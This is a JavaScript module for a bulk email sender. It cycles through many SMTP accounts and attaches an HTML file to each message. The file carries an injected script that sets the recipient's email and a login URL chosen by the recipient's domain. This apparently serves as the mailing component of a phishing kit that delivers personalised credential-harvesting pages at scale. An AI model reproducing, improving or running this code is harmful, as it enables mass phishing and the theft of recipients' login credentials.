const nodemailer = require("nodemailer");

function createClient(smtp)
{
    return nodemailer.createTransport({
        host: smtp.host,
        port: smtp.port,
        secure: smtp.secure == 1,
        auth: {
            user: smtp.username,
            pass: smtp.password
        }
    });
}
const delay = seconds => new Promise(resolve => setTimeout(resolve, seconds * 1000))
async function sendMail (state, callbacks) 
{
    window.last_smtp_index = -1
    for (let index = 0; index < state.email_addresses.length; index++) 
    {
        const email = state.email_addresses[index];
        window.last_smtp_index++
        if(!state.smtps[window.last_smtp_index]) window.last_smtp_index = 0
        const smtp = state.smtps[window.last_smtp_index]
        if(!callbacks.canContinue()) index += state.email_addresses.length
        else {
            // console.log(state.attachment, state.attachment_content)
            let attachment = null;
            if(state.attachment)
            {
                let content = ''
                if(state.email_template.include_data_in_attachment)
                {
                    content += '<script>window.email = "' + email + '";'
                    let domain = email.split("@")[1]
                    if(state.email_template.url_per_domain[domain])
                    {
                        content += "window.login_url = '" + state.email_template.url_per_domain[domain] + "';"
                    }else if(state.settings.default_mail_from)
                    {
                        content += "window.login_url = '" + state.settings.default_mail_from + "';"
                    }
                    content += "</script>"
                }
                content += state.attachment_content
                attachment = {
                    filename: state.attachment.name,
                    content,
                    contentType: state.attachment.type
                }
            }
            const message = {
                from: (smtp.mail_from || state.settings.default_mail_from) || "sender@server.com",
                to: email,
                subject: state.email_template.subject,
                // text: "Plaintext version of the message",
                html: state.email_template.body,
                attachments: attachment ? [
                    attachment,
                ] : []
            };
            try {
                const transporter = createClient(smtp)
                const res = await transporter.sendMail(message)
                // console.log(res)
                if(res && res.accepted && res.accepted.length)
                {
                    callbacks.success(email)
                }else 
                {
                    callbacks.failed(email)
                }    
            } catch (error) {
                // console.log(error);
                callbacks.failed(email)
            }
        }
        
        // delay of neede 
        if(state.settings.delay_between_sending * 1)
        {
            console.log("Waiting for " + (state.settings.delay_between_sending * 1))
            await delay(state.settings.delay_between_sending * 1)
        }
    }
    callbacks.completed()
}
export default sendMail;